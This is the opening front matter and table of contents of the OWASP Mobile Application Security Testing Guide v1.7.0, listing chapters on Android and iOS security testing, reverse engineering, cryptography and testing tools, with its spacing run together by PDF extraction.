MASTG Mobile Application Security Testing Guide Version v1.7.0 Sven Schleier Carlos Holguera\nOWASP Mobile Application Security Testing Guide (MASTG) v1.7.0 released October 30, 2023 Release Notes: https://github.com/OWASP/owasp-mastg/releases/tag/v1.7.0 Online version available at https://github.com/OWASP/owasp-mastg/releases/t ag/v1.7.0 The OWASP MASTG, available online at https://mas.owasp.org/MASTG, is part of the OWASP Mobile Application Security (MAS) Project and is based on the OWASP Mobile Application Security Verification Standard (MASVS) v2.0.0 https://mas.owasp.org Copyright © The OWASP Foundation\nThisworkislicensedunderCreativeCommonsAttribution-ShareAlike4.0International. Foranyreuseordistribution,you mustmakecleartoothersthelicensetermsofthiswork. OWASP®isaregisteredtrademarkoftheOWASPFoundation, Inc. ISBN:978-1-257-96636-3 CoverdesignbyCarlosHolguera 3\nContents Foreword 12 Frontispiece 14 AbouttheOWASPMASTG . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14 Authors . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14 Co-Authors . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 15 Changelog . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16 Disclaimer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16 CopyrightandLicense . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16 OWASPMASVSandMASTGAdoption 17 MobilePlatformProviders . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17 CertificationInstitutions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17 StandardizationInstitutions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18 GovernmentalInstitutions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19 EducationalInstitutions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19 ApplicationinScientificResearch . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19 Books . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19 IndustryCaseStudies . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20 Acknowledgments 21 Contributors . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21 (cid:0)MASAdvocates . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21 OurMASAdvocates . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22 IntroductiontotheOWASPMobileApplicationSecurityProject 25 KeyAreasinMobileApplicationSecurity . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25 NavigatingtheOWASPMASTG . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27 MobileApplicationTaxonomy 28 NativeApp . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28 WebApp . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28 HybridApp . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29 ProgressiveWebApp . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29 What’sCoveredintheMobileTestingGuide . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29 MobileApplicationSecurityTesting 30 PrinciplesofTesting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 30 SecurityTestingandtheSDLC . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35 References . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41 MobileAppTamperingandReverseEngineering 42 WhyYouNeedIt . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 42 BasicTamperingTechniques . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 43 StaticandDynamicBinaryAnalysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 43 AdvancedTechniques . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 47 References . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 49 MobileAppAuthenticationArchitectures 50 GeneralAssumptions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 50 GeneralGuidelinesonTestingAuthentication . . . . . . . . . . . . . . . . . . . . . . . . . . . . 51 Statefulvs.StatelessAuthentication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 51 OAuth2.0 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 53 UserLogout . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 55 SupplementaryAuthentication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56 Two-factorAuthentication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56 LoginActivityandDeviceBlocking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 58 4\nMobileAppNetworkCommunication 59 SecureConnections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 59 ServerTrustEvaluation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 59 VerifyingtheTLSSettings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 61 InterceptingHTTP(S)Traffic . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 63 InterceptingNon-HTTPTraffic . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 64 InterceptingTrafficfromtheAppProcess . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 64 InterceptingTrafficontheNetworkLayer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 64 MobileAppCryptography 71 KeyConcepts . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 71 IdentifyingInsecureand/orDeprecatedCryptographicAlgorithms . . . . . . . . . . . . . . . . . . . . 71 CommonConfigurationIssues . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 72 CryptographicAPIsonAndroidandiOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 76 CryptographicPolicy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 76 CryptographyRegulations . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 76 MobileAppCodeQuality 77 InjectionFlaws . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 77 Cross-SiteScriptingFlaws . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 79 MemoryCorruptionBugs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 80 BinaryProtectionMechanisms . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 82 MobileAppUserPrivacyProtection 84 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 84 TestingforPrivacyinMobileApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 86 TestingUserEducationonDataPrivacyontheAppMarketplace . . . . . . . . . . . . . . . . . . . . 87 TestingUserEducationonSecurityBestPractices . . . . . . . . . . . . . . . . . . . . . . . . . . 87 AndroidPlatformOverview 89 AndroidArchitecture . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 89 AndroidSecurity: Defense-in-DepthApproach . . . . . . . . . . . . . . . . . . . . . . . . . . . . 92 AndroidApplicationStructure . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 95 AndroidApplicationPublishing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 104 AndroidSecurityTesting 108 AndroidTestingSetup . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 108 InstallingApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 111 ObtainingandExtractingApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 111 ExploringtheAppPackage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 113 SymbolicExecution . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 115 Patching . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 122 RetrievingStrings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 124 AccessingAppDataDirectories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 125 DynamicAnalysisonNon-RootedDevices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 127 StaticAnalysisonAndroid . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 127 BypassingCertificatePinning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 127 SettingUpanInterceptionProxy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 129 MethodHooking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 135 GettingLoadedClassesandMethodsDynamically . . . . . . . . . . . . . . . . . . . . . . . . . . 140 LibraryInjection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 140 Debugging . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 142 JNITracing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 152 MonitoringSystemLogs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 152 RuntimeReverseEngineering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 153 Host-DeviceDataTransfer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 155 DecompilingJavaCode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 156 ProcessExploration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 159 Repackaging&Re-Signing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 163 ReviewingDecompiledJavaCode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 164 5\nGetOpenConnections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 165 GetLoadedNativeLibraries . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 166 AccessingtheDeviceShell . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 166 BasicNetworkMonitoring/Sniffing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 168 ReviewingDisassembledNativeCode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 171 DisassemblingNativeCode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 174 ExecutionTracing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 178 InformationGathering-APIUsage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 179 RetrievingCrossReferences . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180 MethodTracing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180 GetOpenFiles . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180 DisassemblingCodetoSmali . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 181 NativeCodeTracing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 181 InformationGathering-NetworkCommunication . . . . . . . . . . . . . . . . . . . . . . . . . . . 183 SandboxInspection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 184 AutomatedStaticAnalysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 184 ListingInstalledApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 184 DynamicAnalysisonAndroid . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 185 TaintAnalysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 185 WaitingfortheDebugger . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 186 Emulation-basedAnalysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 188 ReverseEngineeringAndroidApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 189 RepackagingApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 189 AndroidDataStorage 190 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 190 DeterminingWhetherSensitiveDataIsSharedwithThirdPartiesviaEmbeddedServices . . . . . . . . . . 203 DeterminingWhetherSensitiveDataIsSharedwithThirdPartiesviaNotifications . . . . . . . . . . . . . 203 TestingBackupsforSensitiveData . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 204 TestingLocalStorageforSensitiveData . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 206 TestingMemoryforSensitiveData . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 208 DeterminingWhethertheKeyboardCacheIsDisabledforTextInputFields . . . . . . . . . . . . . . . . 214 TestingLogsforSensitiveData . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 215 TestingtheDevice-Access-SecurityPolicy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 217 AndroidCryptographicAPIs 219 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 219 TestingSymmetricCryptography . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 223 TestingtheConfigurationofCryptographicStandardAlgorithms . . . . . . . . . . . . . . . . . . . . 224 TestingRandomNumberGeneration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 225 TestingthePurposesofKeys . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 226 AndroidLocalAuthentication 227 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 227 TestingBiometricAuthentication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 232 TestingConfirmCredentials . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 233 AndroidNetworkCommunication 234 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 234 TestingCustomCertificateStoresandCertificatePinning . . . . . . . . . . . . . . . . . . . . . . . 235 TestingEndpointIdentifyVerification . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 239 TestingtheSecurityProvider . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 242 TestingDataEncryptionontheNetwork . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 242 TestingtheTLSSettings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 243 AndroidPlatformAPIs 245 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 245 TestingWebViewProtocolHandlers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 258 TestingforOverlayAttacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 259 TestingWebViewsCleanup . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 260 6\nTestingforAppPermissions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 261 CheckingforSensitiveDataDisclosureThroughtheUserInterface . . . . . . . . . . . . . . . . . . . 265 FindingSensitiveInformationinAuto-GeneratedScreenshots . . . . . . . . . . . . . . . . . . . . . . 265 TestingforVulnerableImplementationofPendingIntent . . . . . . . . . . . . . . . . . . . . . . . . 267 TestingJavaScriptExecutioninWebViews . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 268 TestingforSensitiveFunctionalityExposureThroughIPC . . . . . . . . . . . . . . . . . . . . . . . . 269 DeterminingWhetherSensitiveStoredDataHasBeenExposedviaIPCMechanisms . . . . . . . . . . . . 276 TestingDeepLinks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 280 TestingforJavaObjectsExposedThroughWebViews . . . . . . . . . . . . . . . . . . . . . . . . . 285 AndroidCodeQualityandBuildSettings 287 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 287 MakeSureThatFreeSecurityFeaturesAreActivated . . . . . . . . . . . . . . . . . . . . . . . . . 289 TestingforInjectionFlaws . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 290 TestingLocalStorageforInputValidation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 291 MemoryCorruptionBugs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 292 TestingObjectPersistence . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 293 TestingImplicitIntents . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 295 TestingEnforcedUpdating . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 297 CheckingforWeaknessesinThirdPartyLibraries . . . . . . . . . . . . . . . . . . . . . . . . . . . 298 TestingforURLLoadinginWebViews . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 299 AndroidAnti-ReversingDefenses 301 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 301 TestingwhethertheAppisDebuggable . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 317 TestingReverseEngineeringToolsDetection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 318 TestingRootDetection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 319 TestingFileIntegrityChecks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 320 TestingforDebuggingSymbols . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 321 TestingforDebuggingCodeandVerboseErrorLogging . . . . . . . . . . . . . . . . . . . . . . . . 321 TestingAnti-DebuggingDetection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 322 TestingRuntimeIntegrityChecks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 323 TestingObfuscation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 324 TestingEmulatorDetection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 325 MakingSurethattheAppisProperlySigned . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 325 iOSPlatformOverview 327 iOSSecurityArchitecture . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 327 SoftwareDevelopmentoniOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 331 AppsoniOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 331 iOSSecurityTesting 334 iOSTestingSetup . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 334 DynamicAnalysisonNon-JailbrokenDevices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 337 MethodHooking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 339 GettingLoadedClassesandMethodsdynamically . . . . . . . . . . . . . . . . . . . . . . . . . . 340 SandboxInspection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 341 InformationGathering-APIUsage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 341 Emulation-basedAnalysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 341 MonitoringSystemLogs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 345 RepackagingApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 346 LibraryInjection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 347 ProcessExploration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 347 Waitingforthedebugger . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 351 GetLoadedNativeLibraries . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 351 AutomatedStaticAnalysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 352 RepackagingandRe-Signing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 352 DecompilingNativeCode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 353 InformationGathering-NetworkCommunication . . . . . . . . . . . . . . . . . . . . . . . . . . . 353 MethodTracing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 354 7\nRuntimeReverseEngineering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 354 BasicNetworkMonitoring/Sniffing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 356 RetrievingStrings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 356 NativeCodeTracing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 357 AccessingAppDataDirectories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 357 SymbolicExecution . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 361 ExploringtheAppPackage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 362 AccessingtheDeviceShell . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 366 ExtractingInformationfromtheApplicationBinary . . . . . . . . . . . . . . . . . . . . . . . . . . 368 PatchingReactNativeApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 370 Patching . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 371 RetrievingCrossReferences . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 371 InstallingApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 371 GetOpenConnections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 373 DumpingKeyChainData . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 373 DisassemblingNativeCode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 375 ReviewingDecompiledObjective-CandSwiftCode . . . . . . . . . . . . . . . . . . . . . . . . . . 377 ReviewingDisassembledObjective-CandSwiftCode . . . . . . . . . . . . . . . . . . . . . . . . . 377 BypassingCertificatePinning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 382 ListingInstalledApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 384 Debugging . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 384 GetOpenFiles . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 388 SettingupanInterceptionProxy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 389 StaticAnalysisoniOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 389 ReverseEngineeringiOSApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 390 Host-DeviceDataTransfer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 390 DynamicAnalysisoniOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 392 ObtainingandExtractingApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 392 ExecutionTracing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 394 ReviewingDisassembledNativeCode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 394 iOSDataStorage 398 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 398 CheckingLogsforSensitiveData . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 406 TestingLocalDataStorage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 407 TestingBackupsforSensitiveData . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 410 FindingSensitiveDataintheKeyboardCache . . . . . . . . . . . . . . . . . . . . . . . . . . . . 414 DeterminingWhetherSensitiveDataIsSharedwithThirdParties . . . . . . . . . . . . . . . . . . . . 415 iOSCryptographicAPIs 416 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 416 VerifyingtheConfigurationofCryptographicStandardAlgorithms . . . . . . . . . . . . . . . . . . . . 419 TestingKeyManagement . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 420 TestingRandomNumberGeneration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 421 iOSLocalAuthentication 422 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 422 TestingLocalAuthentication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 424 iOSNetworkCommunication 427 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 427 TestingtheTLSSettings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 430 TestingCustomCertificateStoresandCertificatePinning . . . . . . . . . . . . . . . . . . . . . . . 431 TestingEndpointIdentityVerification . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 432 TestingDataEncryptionontheNetwork . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 433 iOSPlatformAPIs 436 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 436 TestingWebViewProtocolHandlers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 450 TestingAppExtensions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 454 8\nTestingCustomURLSchemes . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 455 CheckingforSensitiveDataDisclosedThroughtheUserInterface . . . . . . . . . . . . . . . . . . . . 468 TestingAppPermissions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 469 DeterminingWhetherNativeMethodsAreExposedThroughWebViews . . . . . . . . . . . . . . . . . . 474 DeterminingWhetherSensitiveDataIsExposedviaIPCMechanisms . . . . . . . . . . . . . . . . . . 477 TestingUIPasteboard . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 478 TestingforSensitiveFunctionalityExposureThroughIPC . . . . . . . . . . . . . . . . . . . . . . . . 480 TestingAuto-GeneratedScreenshotsforSensitiveInformation . . . . . . . . . . . . . . . . . . . . . 480 TestingUIActivitySharing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 481 TestingUniversalLinks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 487 TestingObjectPersistence . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 501 MemoryCorruptionBugs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 501 TestingEnforcedUpdating . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 502 CheckingforWeaknessesinThirdPartyLibraries . . . . . . . . . . . . . . . . . . . . . . . . . . . 503 TestingforDebuggingCodeandVerboseErrorLogging . . . . . . . . . . . . . . . . . . . . . . . . 516 TestingAnti-DebuggingDetection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 518 TestingJailbreakDetection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 518 TestingwhethertheAppisDebuggable . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 519 TestingObfuscation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 520 TestingReverseEngineeringToolsDetection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 520 TestingforDebuggingSymbols . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 520 TestingEmulatorDetection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 521 TestingFileIntegrityChecks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 521 MakingSurethattheAppIsProperlySigned . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 522 TestingTools 524 gplaycli . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 524 Xposed . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 524 APKiD . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 525 JustTrustMe . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 526 objectionforAndroid . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 526 Drozer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 527 Scrcpy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 528 AndroidStudio . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 528 FridaforAndroid . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 529 Apktool . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 532 Termux . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 533 adb . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 533 SSLUnpinning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 533 apkx . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 533 RootCloakPlus . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 534 Angr . . . . . . . . . . . . . . . . . . 